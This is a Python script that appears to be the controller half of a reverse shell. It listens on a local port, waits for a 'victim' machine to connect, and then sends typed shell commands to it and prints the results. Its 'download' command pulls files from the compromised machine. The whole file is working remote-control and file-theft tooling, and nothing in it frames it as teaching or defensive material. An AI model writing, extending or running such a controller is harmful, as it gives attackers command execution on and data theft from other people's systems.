import logging
import os
import socket
import sys

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

FORMAT = 'utf-8'


def disconnect(server, victim):
    victim.close()
    server.close()
    sys.exit()


def cmd_response(victim):
    response = victim.recv(4096).decode()
    print(response, end="")


def run_commands(server, victim):
    try:
        while True:
            command = input("$: ")
            if command.lower()[:8] == 'download':
                download(victim, command)
            elif command == 'exit':
                disconnect(server, victim)
            elif command:
                run_command(victim, command)
    except KeyboardInterrupt:
        logging.info(f"Disconnecting. Victim: {victim}")
    finally:
        disconnect(server, victim)


def download(victim, command):
    file_name = command[9:]
    victim.send(command.encode(FORMAT))
    file_data = victim.recv(6144)
    with open(os.getcwd() + '\\downloads\\' + file_name, 'wb') as file:
        file.write(file_data)


def run_command(victim, command: str):
    victim.send(command.encode(FORMAT))
    cmd_response(victim)


def received_connection(server):
    try:
        victim, address = server.accept()
        logging.info(f"Connection established with {address}")
        return victim
    except KeyboardInterrupt:
        disconnect(server, victim)


def handle_connection(server):
    victim = received_connection(server)
    run_commands(server, victim)


def start_server(host: str, port: int):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(5)
        return server
    except:
        logging.exception(f"Error occurred with starting server. Host: {host}, Port: {port}")
        restart = input("Do you want to try again? y/n: \n")
        if restart.lower() == 'y':
            start_server(host, port)
        elif restart.lower() == 'n':
            sys.exit()


def main():
    server = start_server(host="127.0.0.1", port=8989)
    logging.info("[SERVER IS LISTENING]")
    handle_connection(server)


if __name__ == '__main__':
    main()
